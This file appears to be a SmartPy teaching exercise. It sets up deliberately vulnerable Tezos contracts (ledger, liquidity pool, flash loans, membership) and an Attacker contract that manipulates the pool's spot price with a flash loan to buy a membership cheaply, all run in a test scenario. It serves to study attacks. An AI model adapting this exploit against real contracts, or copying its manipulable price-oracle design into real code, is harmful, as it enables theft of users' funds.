import smartpy as sp

@sp.module
def main():

    paramType:type = sp.record(source = sp.address, destination = sp.address, amount = sp.nat)

    class Ledger(sp.Contract):
        def __init__(self, owner, total_supply):
            self.data.balances = sp.big_map({ owner : total_supply })
            self.data.operators = sp.big_map({ owner: sp.set(owner)})
          
    
        @sp.entrypoint
        def transfer(self, source, destination, amount):
            assert self.data.operators[source].contains(sp.sender)
            assert self.data.balances[source] >= amount
            self.data.balances[source] = sp.as_nat(self.data.balances[source] - amount)
            if not self.data.balances.contains(destination):
                self.data.balances[destination] = sp.nat(0)
                if not self.data.operators.contains(sp.sender):
                    self.data.operators[destination] = sp.set(destination)
            self.data.balances[destination] += amount

        @sp.onchain_view
        def get_balance(self, user):
            sp.cast(user, sp.address)
            return self.data.balances[user]

        @sp.entrypoint
        def add_operator(self, operator):
            if not self.data.operators.contains(sp.sender):
                self.data.operators[sp.sender] = sp.set(sp.sender)
            self.data.operators[sp.sender].add(operator)

        @sp.entrypoint
        def del_operator(self, operator):
            self.data.operators[sp.sender].remove(operator)
    
    class liquidity_pool(sp.Contract):
        def __init__(self, owner, ledger):
            self.data.ledger = ledger
            self.data.ledger_transfer = None
            self.data.owner = owner
            self.data.K = sp.tez(0)
            self.data.tokens_owned = sp.nat(0)
            # tokens_owned * sp.balance = K -> should always be true

        @sp.entrypoint
        def provide_liquidity(self, deposited_tokens):
            assert sp.sender == self.data.owner
            assert self.data.K == sp.tez(0)
            self.data.K = sp.mul(sp.balance, deposited_tokens)

            self.data.tokens_owned = deposited_tokens

            self.data.ledger_transfer = sp.contract(paramType, self.data.ledger, entrypoint="transfer")
            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = deposited_tokens), sp.tez(0), self.data.ledger_transfer.unwrap_some())
            
        @sp.entrypoint
        def withdraw_liquidity(self):
            assert sp.sender == self.data.owner
            sp.send(sp.sender, sp.balance)
            
            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = self.data.tokens_owned), sp.tez(0), self.data.ledger_transfer.unwrap_some())

            self.data.tokens_owned = sp.nat(0)
            self.data.K = sp.tez(0)

        
        @sp.entrypoint
        def sell_tokens(self, nb_tokens_sold, min_tez_requested):
            ratio = sp.ediv(self.data.K, self.data.tokens_owned + nb_tokens_sold).unwrap_some()
            tez_obtained = sp.balance - sp.fst(ratio)
            assert tez_obtained >= min_tez_requested

            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = nb_tokens_sold), sp.tez(0), self.data.ledger_transfer.unwrap_some())

            self.data.tokens_owned += nb_tokens_sold
            sp.send(sp.sender, tez_obtained)

        @sp.entrypoint
        def buy_tokens(self, min_tokens_bought):
            sp.cast(min_tokens_bought, sp.nat)
            tokens_obtained = sp.as_nat(self.data.tokens_owned - sp.fst(sp.ediv(self.data.K, sp.balance).unwrap_some()))
            assert tokens_obtained >= min_tokens_bought

            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = tokens_obtained), sp.tez(0), self.data.ledger_transfer.unwrap_some())

            self.data.tokens_owned = sp.as_nat(self.data.tokens_owned - tokens_obtained)
            

        @sp.onchain_view
        def get_token_price(self):
            # returns what we would get if we sold one token
            ratio1 = sp.ediv(self.data.K, self.data.tokens_owned).unwrap_some()
            ratio2 = sp.ediv(self.data.K, sp.as_nat(self.data.tokens_owned - 1)).unwrap_some()
            trace ("The current value of K is:")
            trace(self.data.K)
            trace("The pool owns this amount of tokens:")
            trace(self.data.tokens_owned)
            trace("The balance of the pool is:")
            trace(sp.balance)
            trace("The ratios before and after a potential purchase of 1 token would be:")
            trace(ratio1)
            trace(ratio2)
            token_price = sp.fst(ratio2) - sp.fst(ratio1)
            trace("The price of the token returned is:")
            trace(token_price)
            return token_price

    class flash_loanTez(sp.Contract):
        def __init__(self, owner, ledger, interest_rate):
            self.data.owner = owner
            self.data.interest_rate = interest_rate
            self.data.in_progress = False
            self.data.loan_amount = sp.tez(0)
            self.data.borrower = owner
            self.data.repaid = False

        @sp.entrypoint
        def deposit(self):
            pass
        
        @sp.entrypoint
        def borrow(self, loan_amount, callback):
            assert not self.data.in_progress
            self.data.in_progress = True

            self.data.borrower = sp.sender
            self.data.loan_amount = loan_amount
            sp.send(sp.sender, loan_amount)

            sp.transfer((), sp.tez(0), callback)
            
            flash_loan_check_repaid = sp.contract(sp.unit, sp.self_address(), entrypoint="check_repaid").unwrap_some()
            sp.transfer((), sp.tez(0), flash_loan_check_repaid)

        @sp.entrypoint
        def repay(self):
            assert self.data.in_progress
            assert sp.amount >= sp.split_tokens(self.data.loan_amount, 100 + self.data.interest_rate, 100)
            self.data.repaid = True
        
        @sp.entrypoint
        def check_repaid(self):
            assert self.data.in_progress
            assert self.data.repaid
            self.data.in_progress = False

        @sp.entrypoint
        def claim(self):
            assert sp.sender == self.data.owner
            assert not self.data.in_progress
            sp.send(sp.sender, sp.balance)
    
    class flash_loan(sp.Contract):
        def __init__(self, owner, ledger, interest_rate):
            self.data.ledger = ledger
            self.data.owner = owner
            self.data.interest_rate = interest_rate
            self.data.in_progress = False
            self.data.loan_amount = sp.nat(0)
            self.data.ledger_contract_opt = None
            self.data.tokens_owned = sp.nat(0)
            self.data.borrower = owner

        @sp.entrypoint
        def deposit(self, tokens_deposited):
            self.data.ledger_contract_opt = sp.contract(paramType, self.data.ledger, entrypoint="transfer")
            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = tokens_deposited), sp.tez(0), self.data.ledger_contract_opt.unwrap_some())
            self.data.tokens_owned = tokens_deposited
        
        @sp.entrypoint
        def borrow(self, loan_amount, callback):
            assert not self.data.in_progress
            self.data.in_progress = True
            self.data.borrower = sp.sender
            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = loan_amount), sp.tez(0), self.data.ledger_contract_opt.unwrap_some())
            self.data.loan_amount = loan_amount

            #sp.cast(callback, ..)
            sp.transfer((), sp.tez(0), callback)
            
            flash_loan_check_repaid = sp.contract(sp.unit, sp.self_address(), entrypoint="check_repaid").unwrap_some()
            sp.transfer((), sp.tez(0), flash_loan_check_repaid)

        @sp.entrypoint
        def check_repaid(self):
            assert self.data.in_progress
            amount_repaid = (self.data.loan_amount * (100 + self.data.interest_rate)) / 100
            sp.transfer(sp.record(source = self.data.borrower, destination = sp.self_address(), amount = amount_repaid), sp.tez(0), self.data.ledger_contract_opt.unwrap_some())
            self.data.in_progress = False

        @sp.entrypoint
        def claim(self):
            assert sp.sender == self.data.owner
            assert not self.data.in_progress
            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = self.data.tokens_owned), sp.tez(0), self.data.ledger_contract_opt.unwrap_some())
            self.data.tokens_owned = sp.nat(0)

    class Membership(sp.Contract):
        def __init__(self, membership_price, owner, ledger, liquidity_pool):
            self.data.owner = owner
            self.data.membership_price = membership_price
            self.data.members = sp.set()
            self.data.ledger = ledger
            self.data.liquidity_pool = liquidity_pool

        @sp.entrypoint
        def join(self):
            assert sp.amount == self.data.membership_price
            self.data.members.add(sp.sender)
            sp.send(self.data.owner, sp.amount)

        @sp.entrypoint
        def join_with_tokens(self, nb_tokens):
            sp.cast(nb_tokens, sp.nat)
            token_price =  sp.view("get_token_price", self.data.liquidity_pool, (), sp.mutez).unwrap_some();
            assert sp.mul(token_price, nb_tokens) > self.data.membership_price
            ledger_contract = sp.contract(paramType, self.data.ledger, entrypoint="transfer").unwrap_some()
            sp.transfer(sp.record(source = sp.sender, destination = self.data.owner, amount = nb_tokens), sp.tez(0), ledger_contract)
            self.data.members.add(sp.sender)

    class Attacker(sp.Contract):
        def __init__(self, ledger, liquidity_pool, membership, flash_loan, membership_price):
            self.data.ledger = ledger
            self.data.liquidity_pool = liquidity_pool
            self.data.membership = membership
            self.data.flash_loan = flash_loan
            self.data.expected_bought_tokens = sp.nat(1667)
            self.data.loan_amount = sp.tez(10000)
            self.data.membership_price = membership_price

        @sp.entrypoint
        def attack(self):
            trace("attack starts")
            flash_loan_borrow = sp.contract(sp.record(loan_amount = sp.mutez, callback = sp.contract[sp.unit]),
                                             self.data.flash_loan,
                                             entrypoint="borrow").unwrap_some()
            part2_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attack_part2").unwrap_some()
            trace("We borrow this number of tez from the flash_loan. It will then call part 2 of the attack")
            trace(self.data.loan_amount)
            sp.transfer(sp.record(loan_amount = self.data.loan_amount, callback = part2_contract), sp.tez(0), flash_loan_borrow)

        @sp.entrypoint
        def attack_part2(self):
            trace("attack Part 2")
            liquidity_pool_buy_tokens = sp.contract(sp.nat, self.data.liquidity_pool, entrypoint="buy_tokens").unwrap_some()
            trace("We purchase some tokens using these borrowed tez")
            trace("We expect to receive this amount:")
            trace(self.data.expected_bought_tokens)
            sp.transfer(self.data.expected_bought_tokens, self.data.loan_amount, liquidity_pool_buy_tokens)    

            part3_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attack_part3").unwrap_some()
            trace("We call part3 in a transaction so that it takes place after the purchase is effective")
            sp.transfer((), sp.tez(0), part3_contract)


        @sp.entrypoint
        def attack_part3(self):
            trace("We call the get_token_price view")
            token_price =  sp.view("get_token_price", self.data.liquidity_pool, (), sp.mutez).unwrap_some()
            trace("Token price is now:")
            trace(token_price)
            sp.cast(self.data.membership_price, sp.mutez)
            price_in_tokens = sp.fst(sp.ediv(self.data.membership_price, token_price).unwrap_some()) + 1
            trace("Price in tokens at which we buy the membership:")
            trace(price_in_tokens)
            membership_contract = sp.contract(sp.nat, self.data.membership, entrypoint = "join_with_tokens").unwrap_some()

            trace("Purchase of the membership")
            sp.transfer(price_in_tokens, sp.tez(0), membership_contract)
            
            liquidity_pool_sell_tokens = sp.contract(sp.record(nb_tokens_sold = sp.nat, min_tez_requested = sp.mutez), self.data.liquidity_pool, entrypoint="sell_tokens").unwrap_some()
            trace("We can now sell our tokens back to the liquidity_pool")
            sp.transfer(sp.record(nb_tokens_sold = self.data.expected_bought_tokens, min_tez_requested = sp.tez(0)), sp.tez(0), liquidity_pool_sell_tokens)

            trace("And we repay the flash_loan, sending this amount:")
            amount_repaid = self.data.loan_amount + sp.tez(100)
            trace(amount_repaid)
            flash_loan_repay = sp.contract(sp.unit, self.data.flash_loan, entrypoint="repay").unwrap_some()
            sp.transfer((), amount_repaid, flash_loan_repay)
        
        @sp.entrypoint
        def default(self):
            pass

@sp.add_test(name="testing truly endless wall")
def test():
    alice = sp.test_account("alice")
    bob = sp.test_account("bob")
    scenario = sp.test_scenario(main)
    ledger = main.Ledger(owner = alice.address, total_supply = 1000000)
    scenario += ledger
    liquidity_pool = main.liquidity_pool(owner = alice.address, ledger = ledger.address)
    scenario += liquidity_pool
    ledger.add_operator(liquidity_pool.address).run(sender = alice)
    liquidity_pool.provide_liquidity(2000).run(sender = alice, amount = sp.tez(2000))
    membership = main.Membership(membership_price = sp.tez(1000), owner = alice.address, ledger = ledger.address, liquidity_pool = liquidity_pool.address)
    scenario += membership
    flash_loan = main.flash_loanTez(owner = alice.address, ledger = ledger.address, interest_rate = 1)
    scenario += flash_loan
    ledger.add_operator(flash_loan.address).run(sender = alice)
    flash_loan.deposit().run(sender = alice, amount = sp.tez(100000))
    attacker = main.Attacker(ledger = ledger.address, liquidity_pool = liquidity_pool.address, membership = membership.address, flash_loan = flash_loan.address, membership_price = sp.tez(1000))
    scenario += attacker
    ledger.transfer(source = alice.address, destination = attacker.address, amount = 2000).run(sender = alice)
    ledger.add_operator(liquidity_pool.address).run(sender = attacker.address)
    ledger.add_operator(flash_loan.address).run(sender = attacker.address)
    ledger.add_operator(membership.address).run(sender = attacker.address)
    attacker.attack().run(sender = bob, amount = sp.tez(500))



